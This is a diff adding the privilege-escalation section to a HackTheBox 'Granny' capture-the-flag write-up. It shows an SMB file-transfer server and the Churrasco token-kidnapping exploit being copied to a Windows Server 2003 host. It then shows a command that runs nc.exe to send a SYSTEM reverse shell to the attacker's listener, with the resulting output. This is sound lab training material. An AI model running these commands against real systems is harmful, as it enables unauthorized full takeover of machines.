@@ -127,3 +127,79 @@ Hotfix(s):                 1 Hotfix(s) Installed.
                            [01]: Q147222
 Network Card(s):           N/A
 ```
+This is old enough that it is highly likely that vulnerabilities that will allow privilege escalation are present. Futher research shows this is indeed the case.
+
+### 5. Find something that works
+I begin trying known exploits that may work for privesc. To transfer files I set up an SMB server:
+```bash
+─[us-dedivip-1]─[10.10.14.110]─[htb-jib1337@htb-ah8tqg4ksh]─[/usr/share/doc/python3-impacket/examples]
+└──╼ [★]$ sudo python3 smbserver.py jack /home/htb-jib1337/writeups/HackTheBox/HTB_Granny
+Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+```
+This works great as a subsitute for not having access to powershell.
+After a few fails I get to looking at https://www.exploit-db.com/exploits/6705, which is "Token Kidnapping Local Privilege Escalation" this requires a service account with impersonation privileges, which I currently have as the network service.
+  
+*Basically if you can run code under any service in Win2k3 then you can own Windows, this is because Windows 
+services accounts can impersonate.  Other process (not services) that can impersonate are IIS 6 worker processes 
+so if you can run code from an ASP .NET or classic ASP web application then you can own Windows too. If you provide 
+shared hosting services then I would recomend to not allow users to run this kind of code from ASP.*
+
+
+### 6. Escalate to SYSTEM
+
+The exploit can be found precompiled online, so I download it into the SMB server directory. I also grab nc.exe so I can run it as part of my command as SYSTEM.
+```shell
+─[us-dedivip-1]─[10.10.14.110]─[htb-jib1337@htb-ah8tqg4ksh]─[~/writeups/HackTheBox/HTB_Granny/iis6-exploit-2017-CVE-2017-7269]
+└──╼ [★]$ cp /opt/useful/SecLists/Web-Shells/FuzzDB/nc.exe .
+```
+Following that I can move everything across to the a writeable folder on the target machine.
+```shell
+c:\windows\system32\inetsrv>cd C:\Windows\Temp
+
+C:\WINDOWS\Temp>copy \\10.10.14.110\jack\nc.exe .
+        1 file(s) copied.
+
+C:\WINDOWS\Temp>copy \\10.10.14.110\jack\churrasco.exe .  
+        1 file(s) copied.
+```
+Start my listener, check out the usage and then grab the system token to run nc.
+```shell
+C:\WINDOWS\Temp>churrasco.exe 
+/churrasco/-->Usage: Churrasco.exe [-d] "command to run"
+
+C:\WINDOWS\Temp>churrasco.exe -d "nc.exe -e cmd.exe 10.10.14.110 9998"
+/churrasco/-->Current User: NETWORK SERVICE 
+/churrasco/-->Getting Rpcss PID ...
+/churrasco/-->Found Rpcss PID: 680 
+/churrasco/-->Searching for Rpcss threads ...
+/churrasco/-->Found Thread: 684 
+/churrasco/-->Thread not impersonating, looking for another thread...
+/churrasco/-->Found Thread: 688 
+/churrasco/-->Thread not impersonating, looking for another thread...
+/churrasco/-->Found Thread: 696 
+/churrasco/-->Thread impersonating, got NETWORK SERVICE Token: 0x730
+/churrasco/-->Getting SYSTEM token from Rpcss Service...
+/churrasco/-->Found SYSTEM token 0x728
+/churrasco/-->Running command with SYSTEM Token...
+/churrasco/-->Done, command should have ran as SYSTEM!
+```
+Check out my nc listener and sure enough...
+```shell
+─[us-dedivip-1]─[10.10.14.110]─[htb-jib1337@htb-ah8tqg4ksh]─[~/writeups/HackTheBox/HTB_Granny]
+└──╼ [★]$ nc -lvnp 9998
+listening on [any] 9998 ...
+connect to [10.10.14.110] from (UNKNOWN) [10.129.62.25] 1035
+Microsoft Windows [Version 5.2.3790]
+(C) Copyright 1985-2003 Microsoft Corp.
+
+C:\WINDOWS\TEMP>whoami
+whoami
+nt authority\system
+```
